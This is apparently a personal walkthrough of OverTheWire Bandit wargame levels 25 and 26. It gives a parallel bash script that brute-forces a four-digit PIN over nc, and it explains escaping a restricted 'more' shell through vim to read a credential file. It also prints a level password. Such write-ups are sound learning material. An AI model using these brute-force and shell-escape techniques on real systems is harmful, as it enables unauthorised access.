Level 25

    To beat this level we need to provide the password from the last level separated by and space and a secret number of 4 digits

    We developed the following script to test all codes 

    WE developed the following script to test all codes

    Use nc to recieve the password

    #!/bin/bash

MAXJOBS=50  # número máximo de jobs paralelos

for i in $(seq 1 10000); do
  (
    echo $i
    content=$(echo gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i | nc 127.0.0.1 30002 -w 1)
    if [[ "$content" != *"Wrong!"* ]]; then
      echo "The right code is $i"
      kill 0  # mata todos los procesos del script (opcional)
    fi
  ) &

  # Limitar número de jobs concurrentes
  while [ $(jobs -r | wc -l) -ge $MAXJOBS ]; do
    sleep 0.01
  done
done

wait

    Finally the right code is 4325

Level 26

    In this level you must login to the next user using the key provided even though everytime we login the terminal will be close abruptly

    In case we look at what kind of terminal well discover /usr/bin/showtext which is a custom script that only performs a more command over a text file

    With that i mind we must find a way to scape from that more command. In case we perform the connection with the full screen window the more will list the content of the text file since the content length can fit the screen nothing will happen

    The thing here is to make a smaller window and then perform the connection. That way more command will start in interactive mode and we will be able to start vim from more pressing letter V

    from vim we will be able to spawn a shell using

    :set shell=/bin/sh|:shell

    Then look for the password in /etc/bandit_pass/bandit26
